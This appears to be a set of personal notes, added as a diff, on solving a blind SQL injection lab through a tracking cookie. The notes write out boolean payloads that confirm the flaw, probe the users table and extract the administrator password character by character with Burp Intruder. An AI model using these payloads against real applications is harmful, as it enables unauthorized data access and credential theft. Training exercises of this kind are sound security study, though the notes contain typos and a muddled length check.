@@ -1,0 +1,58 @@
+Blind sqli
+
+vulnerability on tracking cookie
+
+confirm vulnerability
+
+querry running in the backend
+	select trackingid from tracking-table where trackingid = XggeL7VA9ray5o8o
+
+	we get the welcome  abck message, this shows the tracking id exists in the db, if it wasnt we wouldnt get the welcome back message
+
+	for blind sqli we will test to see if we put the wrong tracking id we will still get the welcome back message
+
+	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and 1=1--' ->  result is true
+
+	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and 1=0--' -> result is false
+
+	since the result are different in both occassions this confirms that the application is vulnerable to blind sqli
+
+confirm the users table exist
+	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and (select 'x' from users LIMIT 1)='x'--' -> result is true, we get a wlcome back message this shows that the users table exists
+
+confirm administrator exists in the users table
+	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and (select username from users where username='administrator')='administrator'--'  -> evaluates to true this means the user administrator exists
+
+getting the adminnistrator user password
+	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and (select Ppassword from users where username='administrator')='sdfjkkjfdhgdfr'--' -> not ideal since its like brute forcing the password
+
+	we can check first letter using all letters and numbers if its true(we get welcome back message the the letter is the first part of password)
+
+	we can get the length first
+
+	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--'
+	checks if the lenght of the password is greater than 1
+	querry returns true hence the password length is > 5
+
+	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and (select username from users where username='administrator' and LENGTH(password)>30)='administrator'--' -> returns false
+	if we get false(no welcome back message) it means the password lenght is less than 30 the we can use the intruder to enumerate the rest
+
+	this means the password is greater than 1 but less than 30 we can check untill we get the right length with intruder
+
+	from intruder we find the length of the password to be 20
+
+	we starting with first position and only that
+	------------------
+	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and (select substring(password,1,1) from users where username='administrator')='a'--'
+	--------------------------
+	   -> checking if the first char of the password is a, if there is welcome back message then the first character is a if not its not a we test b untill al the alpha numeric chars are tested, password(1,1) means we are checking for position 1 and 1 only,
+	   results - false for 'a'
+
+	   from intruder first letter is g
+
+	   select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and (select substring(password,1,1) from users where username='administrator')='g'--'
+
+
+password -> g79xbvj5pylt7hyy0d8w
+password -> g79xbvj5pylt7hyy0d8w
+
